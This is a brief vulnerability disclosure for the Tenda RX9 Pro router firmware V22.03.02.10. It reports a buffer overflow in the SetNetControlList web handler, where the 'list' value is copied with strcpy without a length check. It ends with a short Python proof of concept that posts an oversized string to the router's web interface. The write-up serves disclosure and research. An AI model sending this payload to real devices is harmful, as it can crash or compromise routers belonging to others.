# buffer overflow

## Tenda_RX9_Pro

version: V22.03.02.10

## Description:

There is a buffer overflow in httpd/SetNetControlList

## Source:

you may download it from : https://www.tendacn.com/download/detail-4218.html

## Analyse:


![](https://s3.bmp.ovh/imgs/2022/08/15/8d0b6100485e0583.png)

get value from list and send it to sub_43157C

![](https://s3.bmp.ovh/imgs/2022/08/15/1c5219ca8c53bd1b.png)

don't check the length of a1 and call strcpy


## POC
```
url = "http://192.168.1.13/goform/SetNetControlList"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'list': payload})
```
